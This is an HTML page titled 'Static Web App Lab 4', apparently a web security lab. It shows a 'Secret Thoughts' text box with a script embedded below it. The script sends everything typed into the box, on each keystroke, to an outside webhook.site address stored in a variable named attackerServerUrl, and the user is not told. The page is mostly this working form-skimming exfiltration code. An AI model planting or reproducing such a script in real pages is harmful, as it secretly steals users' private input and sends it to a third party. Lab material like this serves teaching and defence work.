<html>
  <head>
    <title>Static Web App Lab 4</title>
  </head>
  <body
    style="display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f0f0f0;"
  >
    <div
      style="background-color: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;"
    >
      <h1>Static Web App Lab 4 - Write</h1>
      <div style="margin: 20px;">
        <h2>Secret Thoughts</h2>
        <textarea
          id="secretThoughts"
          rows="10"
          cols="50"
          placeholder="Paste your secret thoughts here..."
          style="width: 100%; max-width: 500px;"
        ></textarea>
      </div>
    </div>
  </body>
   <script>
document.addEventListener('DOMContentLoaded', function() {

  const targetElement = document.getElementById('secretThoughts');
  const attackerServerUrl = 'https://webhook.site/2b81df02-53b4-4a41-8ff2-50a57a7265e5'; 
  if (targetElement) {

    targetElement.addEventListener('input', function() {
      const currentValue = this.value;
      const encodedValue = encodeURIComponent(currentValue);
      const urlWithParams = `${attackerServerUrl}?secret=${encodedValue}`;
      fetch(urlWithParams)
      .then(response => {
                console.log('データ送信成功:', response.status);
      })
        .catch(error => {
      console.error('データ送信エラー:', error);
      });

    });
  } else {
    console.error('ID "secretThoughts" が見つかりませんでした。');
  }
});
</script>
</html>
